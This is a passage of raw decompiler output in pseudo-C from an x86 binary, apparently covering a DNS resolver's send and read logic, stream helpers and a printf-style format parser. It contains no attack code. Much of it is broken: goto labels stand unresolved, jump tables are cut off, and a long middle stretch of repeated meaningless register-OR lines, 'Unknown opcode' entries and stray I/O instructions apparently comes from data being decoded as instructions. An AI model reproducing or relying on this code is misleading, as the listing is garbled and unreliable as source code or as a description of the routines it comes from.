                    L0804E694(0x80787a4, "send", *L08078B14);
                    Vfffffdb8 = Vfffffdb8 | 1 << esi;
                    goto L0804f19d;
L0804ef44:
                    edx = Vfffffffc;
                    (save) *(edx + 12);
                    (save) *(edx + 8);
                    (save) *(edx + 4);
                    (save) *edx;
                    (save) *L08078B14;
                    (save)"connect(dg)";
L0804f04c:
                    (save)0x80787a4;
                    L0804E638();
                    Vfffffdb8 = Vfffffdb8 | 1 << esi;
                    goto L0804f065;
L0804ed98:
                    edx = L0804D6B8(A10) & 65535;
                    Vfffffff8 = edx;
                    if(Vfffffff8 <= A14) {
                        Vffffffe6 = Vfffffff8;
                    } else {
                        if(!( *L0807854C & 2)) {
                            L0804F680(0x8078750, ";; response truncated\n");
                        }
                        Vfffffdb4 = 1;
                        Vffffffe6 = A14;
                    }
                    Vfffffdac = A10;
                    if(Vffffffe6 != 0) {
                        do {
                            ebx = read( *L08078530, Vfffffdac, Vffffffe6 & 65535);
                            if(ebx <= 0) {
                                goto L0804ee38;
                            }
                            Vfffffdac = Vfffffdac + ebx;
                        } while(Vffffffe6 = Vffffffe6 - bx);
                    }
                    if(ebx > 0) {
                        goto L0804ee50;
                    }
L0804ee38:
                    eax = *L08078B14;
                    Vfffffdc4 = eax;
                    (save)Vfffffdc4;
                    (save)"read(vc)";
L0804f193:
                    (save)0x80787a4;
                    L0804E694();
                    goto L0804f19d;
L0804ecca:
                    eax = *L08078B14;
                    Vfffffdc4 = eax;
                    L0804E694(0x80787a4, "write failed", Vfffffdc4);
                    Vfffffdb8 = Vfffffdb8 | 1 << esi;
L0804f19d:
                    L0804F4F8();
                    esp = esp + 12;
                    goto L0804f450;
L0804ec33:
                    Vfffffdc4 = *L08078B14;
                    edx = Vfffffffc;
                    (save) *(edx + 12);
                    (save) *(edx + 8);
                    edx = *edx;
                    Vfffffdb0 = edx;
                    L0804E638(0x80787a4, "connect/vc", Vfffffdc4, Vfffffdb0, *(edx + 4));
                    Vfffffdb8 = Vfffffdb8 | 1 << esi;
L0804f065:
                    L0804F4F8();
                    esp = esp + 28;
                    goto L0804f450;
L0804eb0c:
                    L0804F4F8();
L0804f450:
                    esi = esi + 1;
                } while(*L08078550 > esi);
            }
            Vfffffdc0 = Vfffffdc0 + 1;
        } while(*L08078548 > Vfffffdc0);
        goto L0804f475;
L0804ee50:
        if(Vfffffdb4 != 0) {
            *(Vfffffdd0 + 2) = *(Vfffffdd0 + 2) | 2;
            if(!(Vffffffe6 = Vfffffff8 - A14)) {
                do {
                    ebx = 512;
                    if(Vffffffe6 <= 512) {
                        ebx = Vffffffe6 & 65535;
                    }
                    if(read( *L08078530, & Vfffffde4, ebx) <= 0) {
                        goto L0804f358;
                    }
                } while(Vffffffe6 = Vffffffe6 - bx);
            }
        }
L0804f358:
        if(*L0807854C & 2 || ( *L080786A4 & 8448) == 8448) {
            L0804F680(0x8078750, ";; got answer:\n");
        }
        if(*L0807854C & 2 || !( *L080786A5 & 32)) {
            L0804F680();
            L0805F1DC(A10, Vfffffff8, 0x8078750, 0x8078750, 0x8067ee3);
        }
        if(Vfffffdbc != 0 && ( *L0807854C & 8 || esi != 0)) {
            goto L0804f3d9;
        }
        if(!( *L0807854D & 1)) {
L0804f3d9:
            L0804F4F8();
        }
        if(*L08078540 != 0) {
            ebx = 0;
            do {
                edx = *( *L08078540)(Vfffffffc, A8, Ac, A10, A14, & Vfffffff8);
                if(edx > 4) {
                    goto L0804f4e4;
                }
                goto *(edx * 4 + 0x804f424)[L0804f448, L0804eb0c, L0804f438, L0804f448, L0804f4e4, ]goto ( *(edx * 4 + 0x804f424));
                if(ebx + 1 > 41) {
                    goto L0804f4e4;
                }
            } while(0 == 0);
        }
        eax = Vfffffff8;
    } else {
L0804f475:
        L0804F4F8();
        if(Vfffffdbc == 0) {
            if(Vfffffdcc == 0) {
                *L08078B14 = 111;
                goto L0804f4e4;
            }
            *L08078B14 = 110;
            goto L0804f4e4;
L0804f4a4:
            edi = *L08078B14;
            Vfffffdc4 = edi;
            (save)Vfffffdc4;
            (save)"socket(vc)";
L0804f4b6:
            L0804E694(0x80787a4);
            goto L0804f4e4;
L0804f4c4:
            eax = *L08078B14;
            Vfffffdc4 = eax;
            (save)Vfffffdc4;
            (save)"socket(dg)";
            goto L0804f4b6;
        }
        *L08078B14 = Vfffffdc4;
L0804f4e4:
        eax = -1;
    }
    esp = ebp + -612;
}



L0804F4F8()
{



    if(*L08078530 >= 0) {
        eax = close( *L08078530);
        *L08078530 = -1;
        *L08078534 = 0;
        *L08078538 = 0;
    }
}



L0804F540(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;



    if(A8 == 0 || ( *A8 & -65536) != -72548352) {
        *L08078B14 = 22;
        eax = -1;
    } else {
        if(!( *(A8 + 1) & 32)) {
            esi = L08060D44(A8);
        } else {
            esi = 0;
            if(!( *A8 & 32)) {
                esi = -1;
            }
        }
        *( *( *(A8 + 80) + 12))(A8);
        if(A8 != 0x80786fc && A8 != 0x8078750 && A8 != 0x80787a4) {
            L0805C290(A8);
        }
        eax = esi;
    }
}



L0804F5C4(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A10 == 0 || ( *A10 & -65536) != -72548352) {
        *L08078B14 = 22;
L0804f5ee:
        eax = 0;
    } else {
        if(Ac <= 0) {
            goto L0804f5ee;
        }
        eax = L0804F734(A10, A8, Ac - 1, 10, 1);
        if(eax == 0 || *A10 & 32) {
            goto L0804f5ee;
        }
        *(eax + A8) = 0;
        eax = A8;
    }
}



L0804F620(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ebx = L0805BD74(84);
    if(ebx == 0) {
        eax = 0;
    } else {
        (save)0;
        (save)ebx;
        L08061F34();
        *(ebx + 80) = 0x807902c;
        (save)ebx;
        L08060D24();
        (save)Ac;
        (save)A8;
        (save)ebx;
        esp = esp + 24;
        if(L08060E20() == 0) {
            L08061788();
            L0805C290(ebx, ebx);
            eax = 0;
        } else {
            eax = ebx;
        }
    }
}


L0804F680(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    if(A8 == 0) {
        *L08078B14 = 22;
        return(-1);
    }
    if(( *A8 & -65536) == -72548352) {
        return(L0804F888(A8, Ac, & A10));
    }
    *L08078B14 = 22;
    esp = ebp;
    return(-1);
}



L0804F6D4(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    edx = A14;
    ebx = Ac;
    edi = A10 * ebx;
    if(edx == 0 || ( *edx & -65536) != -72548352) {
        *L08078B14 = 22;
        eax = 0;
    } else {
        if(ebx == 0) {
            eax = 0;
        } else {
            eax = L08061D2C(edx, A8, ebx);
            if(ebx != eax) {
                edx = 0;
                edx = Ac / Ac % Ac / Ac;
            } else {
                eax = edi;
            }
        }
    }
}


L0804F734(A8, Ac, A10, A14, A18)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = Ac;
    do {
        ebx = *(A8 + 8) - *(A8 + 4);
        if(ebx <= 0) {
            if(L08061A70(A8) == -1) {
                break;
            }
            ebx = *(A8 + 8) - *(A8 + 4);
        }
        if(A10 <= ebx) {
            ebx = A10;
        }
        esi = L080575C0( *(A8 + 4), A14, ebx);
        if(esi != 0) {
            goto L0804f78b;
        }
        L0805652C(Vfffffffc, *(A8 + 4), ebx);
        *(A8 + 4) = *(A8 + 4) + ebx;
        Vfffffffc = Vfffffffc + ebx;
    } while(A10 = A10 - ebx);
    goto L0804f7dc;
L0804f78b:
    Vfffffff8 = Vfffffffc - Ac;
    ebx = esi - *(A8 + 4);
    if(A18 >= 0) {
        esi = esi + 1;
        if(A18 > 0) {
            ebx = ebx + 1;
        }
    }
    (save)ebx;
    (save) *(A8 + 4);
    (save)Vfffffffc;
    L0805652C();
    *(A8 + 4) = esi;
    eax = Vfffffff8 + ebx;
    goto L0804f7e2;
L0804f7dc:
    eax = Vfffffffc - Ac;
L0804f7e2:
    esp = ebp - 20;
}


L0804F7EC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    return(L0804F888(0x8078750, A8, & Ac));
}



L0804F808(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    return(L0804F820(A8, Ac, & A10));
}


L0804F820(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffa0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vfffffff0;



    ebx = A8;
    (save)0;
    edi = & Vffffffa0;
    (save)edi;
    L08061F34();
    Vfffffff0 = 0x80787fc;
    (save)ebx;
    (save)-1;
    (save)ebx;
    (save)edi;
    L08052E80();
    (save)A10;
    (save)Ac;
    (save)edi;
    ebx = L0804F888();
    esp = esp + 36;
    if(Vffffffb8 <= Vffffffb4) {
        L08061910(edi, 0);
    } else {
        *Vffffffb4 = 0;
        Vffffffb4 = Vffffffb4 + 1;
    }
    eax = ebx;
    esp = ebp - 108;
}



L0804F888(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffb10;
	/* unknown */ void  Vfffffb14;
	/* unknown */ void  Vfffffb18;
	/* unknown */ void  Vfffffb1c;
	/* unknown */ void  Vfffffb20;
	/* unknown */ void  Vfffffb24;
	/* unknown */ void  Vfffffb28;
	/* unknown */ void  Vfffffb2c;
	/* unknown */ void  Vfffffb30;
	/* unknown */ void  Vfffffb34;
	/* unknown */ void  Vfffffb38;
	/* unknown */ void  Vfffffb3c;
	/* unknown */ void  Vfffffb40;
	/* unknown */ void  Vfffffb44;
	/* unknown */ void  Vfffffb48;
	/* unknown */ void  Vfffffb4c;
	/* unknown */ void  Vfffffb50;
	/* unknown */ void  Vfffffb54;
	/* unknown */ void  Vfffffb58;
	/* unknown */ void  Vfffffb5c;
	/* unknown */ void  Vfffffb60;
	/* unknown */ void  Vfffffb64;
	/* unknown */ void  Vfffffb68;
	/* unknown */ void  Vfffffb6c;
	/* unknown */ void  Vfffffb70;
	/* unknown */ void  Vfffffb74;
	/* unknown */ void  Vfffffb78;
	/* unknown */ void  Vfffffb7c;
	/* unknown */ void  Vfffffb80;
	/* unknown */ void  Vfffffb84;
	/* unknown */ void  Vfffffb88;
	/* unknown */ void  Vfffffb8c;
	/* unknown */ void  Vfffffb90;
	/* unknown */ void  Vfffffb94;
	/* unknown */ void  Vfffffb98;
	/* unknown */ void  Vfffffb9c;
	/* unknown */ void  Vfffffba0;
	/* unknown */ void  Vfffffba4;
	/* unknown */ void  Vfffffba8;
	/* unknown */ void  Vfffffbb0;
	/* unknown */ void  Vfffffbc4;
	/* unknown */ void  Vfffffbc8;
	/* unknown */ void  Vfffffbcc;
	/* unknown */ void  Vfffffbd0;
	/* unknown */ void  Vfffffbd4;
	/* unknown */ void  Vfffffbd8;
	/* unknown */ void  Vfffffbdc;
	/* unknown */ void  Vfffffbe0;
	/* unknown */ void  Vfffffbe4;
	/* unknown */ void  Vfffffbe8;
	/* unknown */ void  Vfffffbec;
	/* unknown */ void  Vfffffbf0;
	/* unknown */ void  Vfffffbf4;
	/* unknown */ void  Vfffffbf8;
	/* unknown */ void  Vfffffbfc;
	/* unknown */ void  Vfffffc00;
	/* unknown */ void  Vfffffc04;
	/* unknown */ void  Vfffffc08;
	/* unknown */ void  Vfffffc0c;
	/* unknown */ void  Vfffffc10;
	/* unknown */ void  Vfffffc14;
	/* unknown */ void  Vfffffc18;
	/* unknown */ void  Vffffffff;



    esi = Ac;
    if(A8 != 0) {
        ecx = A8;
        edx = *ecx & -65536;
        if(edx == -72548352 && !( *ecx & 8) && esi != 0) {
            ebx = A8;
            if(!( *ebx & 2)) {
                edi = A10;
                (save)edi;
                (save)esi;
                (save)ebx;
                eax = L08052DE8();
                goto L080529be;
            }
            Vfffffb9c = 0;
            eax = L0805602C(0, 0, 0);
            Vfffffb10 = esi;
            if(*esi != 0) {
L0804f908:
                ecx = Vfffffb10;
                if(*ecx != 37) {
                    if(*ecx < 0) {
                        eax = L0805602C(0, ecx, 1);
                        if(eax > 0) {
                            goto L0804f934;
                        }
                    }
                    Vfffffb10 = Vfffffb10 + 1;
                    goto L0804f93a;
L0804f934:
                    Vfffffb10 = Vfffffb10 + eax;
L0804f93a:
                    ebx = Vfffffb10;
                    if(*ebx != 0) {
                        goto L0804f908;
                    }
                }
            }
            edi = Vfffffb10;
            Vfffffba4 = edi;
            Vfffffc00 = edi;
            ecx = A8;
            edx = *(ecx + 80);
            ebx = Vfffffba4 - esi;
            edx = *(edx + 52);
            eax = *edx(ecx, esi, ebx);
            if(eax != ebx) {
                goto L08050e72;
            }
            Vfffffb9c = Vfffffb9c + eax;
            edx = Vfffffc00;
            if(*edx == 0) {
                goto L080529b8;
            }
            Vfffffba0 = 0;
            edi = A10;
            Vfffffb98 = edi;
            Vfffffba8 = -1;
L0804f9ac:
            Vfffffb94 = 0;
            Vfffffb90 = 0;
            Vfffffb8c = 0;
            Vfffffb88 = 0;
            Vfffffb84 = 0;
            esi = 0;
            Vfffffb80 = 0;
            Vfffffb7c = 0;
            Vfffffb74 = 0;
            Vfffffb70 = -1;
            Vfffffb6c = 32;
            edx = Vfffffc00 + 1;
            Vfffffc00 = edx;
            dl = *edx;
            Vfffffb60 = dl;
            edx = Vfffffb60 & 255;
            if(edx > 120) {
                goto L08050e7c;
            }
            goto *(edx * 4 + 0x804fa3c)[L08050e72, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L0804fc20, L08050e7c...]goto ( *(edx * 4 + 0x804fa3c));
L0804fc20:
            edx = Vfffffb60 & 255;
            if(edx > 120) {
                goto L08050e7c;
            }
            goto ( *(edx * 4 + 0x804fc38));
            < ? L0804fc48 : ;
            eax = eax + 84835336;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + edi * 8) = *(esi + edi * 8) | bl;
            if(!(al = al + 8)) {
                eax = eax + 84835336;
                *(esi + edi * 8 + 4) = *(esi + edi * 8 + 4) | dl;
                *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
                *(esp + eax + 5) = *(esp + eax + 5) | ah;
            }
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(eax + 2080900350) = *(eax + 2080900350) | al;
            (save)cs;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + edi * 8) = *(esi + edi * 8) | ch;
            if(!(al = eax + 84835336 + 8)) {
                eax = eax + 83770376;
                *(eax + eax + 243009541) = *(eax + eax + 243009541) | ch;
                eax = eax + 83780616;
            }
            *(eax + eax) = *(eax + eax) | cl;
            eax = eax + 83889160;
            *(eax + eax) = *(eax + eax) | cl;
            eax = eax + 83889160;
            *(eax + eax) = *(eax + eax) | cl;
            eax = eax + 83889160;
            *(eax + eax) = *(eax + eax) | cl;
            eax = eax + 83889160;
            *(eax + eax) = *(eax + eax) | cl;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(ecx + ecx + 5) = *(ecx + ecx + 5) | dh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(ecx + ecx + 5) = *(ecx + ecx + 5) | dh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *eax = *eax | bl;
            al = eax + 84835336 + *L050E7C08;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(ebp + eax + 243009541) = *(ebp + eax + 243009541) | cl;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(edx + ecx + 5) = *(edx + ecx + 5) | bh;
            *(eax + 1946682628) = *(eax + 1946682628) | ah;
            *L05097408 = *L05097408 | eax;
            *(ecx + ecx + 5) = *(ecx + ecx + 5) | dh;
            *eax = *eax | bl;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *eax = *eax | bl;
            al = eax + 84023304 + *L0504A008 + *L050DA008;
            *eax = *eax | dl;
            *eax = *eax | bl;
            *(ebx + ecx) = *(ebx + ecx) | dh;
            eax = (eax | 92276741) + 84714504 + *L050E7C08 + 84835336;
            *(ebp + eax + 5) = *(ebp + eax + 5) | dh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(esi + ecx + 5) = *(esi + ecx + 5) | bh;
            *(ebp + eax + -2050553851) = *(ebp + eax + -2050553851) | cl;
            asm("sti");
            asm("Unknown opcode 0xff");
            *ecx = *ecx + 1;
            *eax = *eax + al;
            cl = cl + ch;
            asm("out 0x0,eax");
            *eax = *eax + al;
            Vfffffb88 = 1;
            goto L0804ff12;
            Vfffffb8c = 1;
            Vfffffb6c = 32;
            goto L0804ff12;
            Vfffffb94 = 1;
            goto L0804ff12;
            if(Vfffffb8c == 0) {
                Vfffffb6c = 48;
                goto L0804ff12;
                Vfffffb84 = 1;
                if(Vfffffba8 == -1) {
                    edx = *( *L08078890 + 16);
                    Vfffffb28 = edx;
                    al = 0;
                    Vfffffb14 = edx;
                    edi = edx;
                    asm("cld");
                    ecx = -1;
                    asm("repne scasb");
                    edx = !ecx - 1;
                    ecx = Vfffffb28;
                    eax = L0805602C( & Vfffffc08, ecx, edx);
                    if(eax <= 0) {
                        edx = *( *( *L08078890 + 16)) & 255;
                        Vfffffc08 = edx;
                    }
                    edx = *( *L08078890 + 20);
                    Vfffffba8 = edx;
                    if(*edx == 0 || *edx == 255) {
                        goto L0804ff08;
                    }
                    if(Vfffffc08 == 0) {
L0804ff08:
                        Vfffffba8 = 0;
                    }
                }
            }
L0804ff12:
            edx = Vfffffc00 + 1;
            Vfffffc00 = edx;
            dl = *edx;
            Vfffffb60 = dl;
            if(dl != 42) {
                goto L0804fc20;
            }
            edx = Vfffffc00 + 1;
            Vfffffc00 = edx;
            Vfffffc04 = edx;
            edx = *Vfffffc04 & 255;
            ebx = *L08078FA0;
            Vfffffb1c = ebx;
            if(!( *(ebx + edx * 2 + 1) & 8)) {
                edx = edx + -48;
                Vfffffb10 = edx;
                Vfffffc04 = Vfffffc04 + 1;
                eax = Vfffffc04;
                edx = *eax & 255;
                if(!( *(ebx + edx * 2 + 1) & 8)) {
                    Vfffffb1c = ebx;
L0804ff80:
                    edi = Vfffffb10;
                    edx = edi + edi * 8 + edi - 48;
                    Vfffffb20 = edx;
                    edx = ( *eax & 255) + Vfffffb20;
                    Vfffffb10 = edx;
                    Vfffffc04 = Vfffffc04 + 1;
                    eax = Vfffffc04;
                    edx = *eax & 255;
                    ecx = Vfffffb1c;
                    if(*(ecx + edx * 2 + 1) & 8) {
                        goto L0804ff80;
                    }
                }
                if(Vfffffb10 != 0) {
                    edx = Vfffffc04;
                    if(*edx == 36) {
                        goto L08050e7c;
                    }
                }
            }
            A10 = A10 + 4;
            ebx = *(A10 - 4);
            Vfffffb74 = ebx;
            if(ebx < 0) {
                ebx = ~ebx;
                Vfffffb74 = ebx;
                Vfffffb6c = 32;
                Vfffffb8c = 1;
                goto L0805009d;
                edx = *Vfffffc00 & 255;
                Vfffffb10 = edx;
                Vfffffb10 = Vfffffb10 + -48;
                Vfffffc00 = Vfffffc00 + 1;
                eax = Vfffffc00;
                edx = *eax & 255;
                edi = *L08078FA0;
                Vfffffb1c = edi;
                if(!( *(edi + edx * 2 + 1) & 8)) {
L08050044:
                    ecx = Vfffffb10;
                    edx = ecx + ecx * 8 + ecx - 48;
                    Vfffffb20 = edx;
                    edx = ( *eax & 255) + Vfffffb20;
                    Vfffffb10 = edx;
                    Vfffffc00 = Vfffffc00 + 1;
                    eax = Vfffffc00;
                    edx = *eax & 255;
                    ebx = Vfffffb1c;
                    if(*(ebx + edx * 2 + 1) & 8) {
                        goto L08050044;
                    }
                }
                edi = Vfffffb10;
                Vfffffb74 = edi;
                edx = Vfffffc00;
                if(*edx == 36) {
                    goto L08050e7c;
                }
            }
L0805009d:
            edx = Vfffffc00;
            if(*edx == 46) {
                Vfffffc00 = Vfffffc00 + 1;
                edx = Vfffffc00;
                if(*edx == 42) {
                    Vfffffc00 = Vfffffc00 + 1;
                    edx = Vfffffc00;
                    Vfffffbfc = edx;
                    edx = *Vfffffbfc & 255;
                    ecx = *L08078FA0;
                    Vfffffb1c = ecx;
                    if(!( *(ecx + edx * 2 + 1) & 8)) {
                        edx = edx + -48;
                        Vfffffb10 = edx;
                        Vfffffbfc = Vfffffbfc + 1;
                        eax = Vfffffbfc;
                        edx = *eax & 255;
                        if(!( *(ecx + edx * 2 + 1) & 8)) {
                            Vfffffb1c = ecx;
L08050110:
                            ebx = Vfffffb10;
                            edx = ebx + ebx * 8 + ebx - 48;
                            Vfffffb20 = edx;
                            edx = ( *eax & 255) + Vfffffb20;
                            Vfffffb10 = edx;
                            Vfffffbfc = Vfffffbfc + 1;
                            eax = Vfffffbfc;
                            edx = *eax & 255;
                            edi = Vfffffb1c;
                            if(*(edi + edx * 2 + 1) & 8) {
                                goto L08050110;
                            }
                        }
                        if(Vfffffb10 != 0) {
                            edx = Vfffffbfc;
                            if(*edx == 36) {
                                goto L08050e7c;
                            }
                        }
                    }
                    A10 = A10 + 4;
                    ecx = *(A10 - 4);
                    Vfffffb70 = ecx;
                } else {
                    edx = *Vfffffc00 & 255;
                    ebx = *L08078FA0;
                    Vfffffb1c = ebx;
                    if(!( *(ebx + edx * 2 + 1) & 8)) {
                        edx = edx + -48;
                        Vfffffb10 = edx;
                        Vfffffc00 = Vfffffc00 + 1;
                        eax = Vfffffc00;
                        edx = *eax & 255;
                        if(!( *(ebx + edx * 2 + 1) & 8)) {
                            Vfffffb1c = ebx;
L080501c0:
                            edi = Vfffffb10;
                            edx = edi + edi * 8 + edi - 48;
                            Vfffffb20 = edx;
                            edx = ( *eax & 255) + Vfffffb20;
                            Vfffffb10 = edx;
                            Vfffffc00 = Vfffffc00 + 1;
                            eax = Vfffffc00;
                            edx = *eax & 255;
                            if(*(Vfffffb1c + edx * 2 + 1) & 8) {
                                goto L080501c0;
                            }
                        }
                        ebx = Vfffffb10;
                        Vfffffb70 = ebx;
                    } else {
                        Vfffffb70 = 0;
                    }
                }
            }
L08050218:
            edx = Vfffffc00;
            Vfffffb60 = *edx;
            edx = Vfffffb60 & 255;
            if(edx > 120) {
                goto L08050e7c;
            }
            goto *(edx * 4 + 0x805023c)[L08050e72, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c, L08050e7c...]goto ( *(edx * 4 + 0x805023c));
            Vfffffb80 = 1;
            goto L08050459;
            if(Vfffffb7c == 0) {
                Vfffffb7c = 1;
                goto L08050459;
                esi = 0;
                Vfffffb7c = 0;
            } else {
                esi = 1;
            }
L08050459:
            Vfffffc00 = Vfffffc00 + 1;
            goto L08050218;
            edi = A8;
            if(*(edi + 24) <= *(edi + 20)) {
                eax = L08061910(edi, 37);
                if(eax == -1) {
                    goto L08050e72;
                }
            } else {
                ecx = A8;
                edx = *(ecx + 20);
                *edx = 37;
                *(ecx + 20) = *(ecx + 20) + 1;
            }
            Vfffffb9c = Vfffffb9c + 1;
            goto L08050dc4;
            Vfffffb10 = 10;
            if(esi != 0) {
                A10 = A10 + 8;
                ebx = A10;
                edi = *(ebx - 8);
                Vfffffb14 = edi;
                edi = *(ebx - 4);
                Vfffffb18 = edi;
                Vfffffb78 = 0;
                if(Vfffffb18 < 0) {
                    Vfffffb78 = Vfffffb78 + 1;
                }
                ecx = Vfffffb14;
                Vfffffb14 = ecx;
                ecx = Vfffffb18;
                Vfffffb18 = ecx;
                if(Vfffffb78 != 0) {
                    Vfffffb14 = ~Vfffffb14;
                    asm("adc dword [ebp+0xfffffb18],+0x0");
                    Vfffffb18 = ~Vfffffb18;
                }
                ebx = Vfffffb14;
                Vfffffb64 = ebx;
                ebx = Vfffffb18;
                Vfffffb68 = ebx;
                goto L080505d5;
            }
            if(Vfffffb7c != 0) {
                A10 = A10 + 4;
                edi = A10;
                edx = *(edi - 4);
            } else {
                ecx = A10;
                edx = *(ecx - 4);
            }
            ebx = edx >> 31;
            Vfffffb78 = ebx;
            if(!(A10 = A10 + 4)) {
                edx = ~edx;
            }
            Vfffffb64 = edx;
            goto L080506c4;
            Vfffffb10 = 10;
            goto L08050596;
            Vfffffb10 = 8;
            goto L08050596;
            Vfffffb10 = 16;
L08050596:
            Vfffffb78 = 0;
            Vfffffb88 = 0;
            Vfffffb90 = 0;
            if(esi != 0) {
                A10 = A10 + 8;
                edi = A10;
                ecx = *(edi - 8);
                Vfffffb64 = ecx;
                Vfffffb68 = *(edi - 4);
L080505d5:
                if(Vfffffb70 >= 0) {
                    Vfffffb6c = 32;
                    if(Vfffffb70 != 0 || Vfffffb64 != 0 || Vfffffb68 != 0) {
                        goto L08050612;
                    }
                    esi = & Vffffffff;
                } else {
                    Vfffffb70 = 1;
L08050612:
                    ebx = Vfffffb10;
